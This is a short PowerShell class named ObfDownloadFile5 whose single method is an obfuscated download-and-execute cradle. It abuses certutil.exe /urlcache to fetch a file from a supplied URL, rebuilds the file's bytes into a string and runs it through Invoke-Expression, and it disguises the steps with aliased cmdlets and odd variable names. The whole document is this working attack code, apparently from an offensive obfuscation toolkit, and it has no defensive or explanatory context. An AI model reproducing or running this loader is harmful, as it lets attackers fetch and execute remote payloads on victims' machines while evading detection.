Class ObfDownloadFile5 {

    static Execute ([String]$url, [String]$path) {
        SV z $path;Set-Item Variable:\5c $url;$NULL=certutil.exe /urlcache -f (GCI Variable:5c).Value (DIR Variable:z).Value;(-Join((CAT -En 3 (DIR Variable:z).Value)|ForEach-Object{[Char](ChildItem Variable:/_).Value}))|.(Get-Alias IE*)

    }

}